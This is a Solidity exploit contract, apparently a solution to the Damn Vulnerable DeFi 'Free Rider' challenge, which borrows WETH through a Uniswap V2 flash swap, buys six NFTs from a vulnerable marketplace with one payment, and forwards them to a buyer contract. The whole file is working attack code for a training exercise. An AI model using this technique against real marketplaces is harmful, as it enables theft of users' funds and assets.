// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "../DamnValuableNFT.sol";

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

interface IUniswapV2Callee {
  function uniswapV2Call(
    address sender,
    uint amount0,
    uint amount1,
    bytes calldata data
  ) external;
}

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function transfer(address dst, uint wad) external returns (bool);
    function balanceOf(address addr) external returns (uint);
}


contract FreeRiderCracker is IUniswapV2Callee, IERC721Receiver, ReentrancyGuard {
    address private immutable FACTORY;  // Uniswap V2 factory
    address private immutable DVT;      // DVT Token
    address private attacker;           // Attacker
    address private buyer;              // Buyer
    IMarketplace marketplace;           // NFT marketplace
    IUniswapV2Router02 private immutable router; // UniswapV2 Router
    IWETH private immutable weth;       // Weth instance
    DamnValuableNFT private immutable nft;  // nft instace
    uint256[] private tokenIds = [0,1,2,3,4,5]; // token ids
   

    constructor(address _weth, address _factory, address _marketplace, address _router, address _dvt, address _nft, address _buyer){
        FACTORY = _factory;
        marketplace = IMarketplace(_marketplace);        
        router = IUniswapV2Router02(_router);
        weth = IWETH(_weth);
        attacker = msg.sender;
        DVT = _dvt;
        nft = DamnValuableNFT(_nft);
        buyer = _buyer;
    }
    
    // View function used to get an idea on how does Uniswap treats each pair
    function getThePair(address _tokenBorrow, uint _amount) public view returns (address token0, address token1, uint amount0Out, uint amount1Out){
        address pair = IUniswapV2Factory(FACTORY).getPair(_tokenBorrow, DVT);
        require(pair != address(0), "!pair");
        token0 = IUniswapV2Pair(pair).token0();
        token1 = IUniswapV2Pair(pair).token1();
        amount0Out = _tokenBorrow == token0 ? _amount : 0;
        amount1Out = _tokenBorrow == token1 ? _amount : 0;
    }

    function flashSwap(address _tokenBorrow, uint _amount) external payable {
        address pair = IUniswapV2Factory(FACTORY).getPair(_tokenBorrow, DVT);
        require(pair != address(0), "!pair");
        require(msg.sender == attacker, "!owner");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        uint amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint amount1Out = _tokenBorrow == token1 ? _amount : 0;

        // need to pass some data to trigger uniswapV2Call
        bytes memory data = abi.encode(_tokenBorrow, _amount);

        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
        
        console.log(" ");
        console.log("FlashSwap Terminated: Attacker Contract: ", weth.balanceOf(address(this)) / (10**18), "WETH");
        console.log("Balances: Attacker Contract:", (address(this).balance)/(10**18), "ETH");
        console.log("Balances: Attacker:", (attacker.balance)/(10**18), "ETH");
        console.log(" ");
    }

    // called by pair contract
    function uniswapV2Call(
        address _sender,
        uint , // -------> amount0 not used
        uint , // -------> amount1 not used
        bytes calldata _data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(FACTORY).getPair(token0, token1);
        require(msg.sender == pair, "!pair");
        require(_sender == address(this), "!sender");

        (address tokenBorrow, uint amount) = abi.decode(_data, (address, uint));


        // Doing the stuff in here with the borrowed tokens
        weth.withdraw(amount); // ---> trigers receive()
        marketplace.buyMany{value: address(this).balance}(tokenIds);
        weth.deposit{value: address(this).balance}();

        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), buyer, i);
        }

        // Pay back the loan
        weth.transfer(pair, weth.balanceOf(address(this)));
    }

    // Callback in order to receive NFTs.
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) 
        external
        override
        nonReentrant
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    // Fallback in order to receive ether.
    receive() external payable {}

}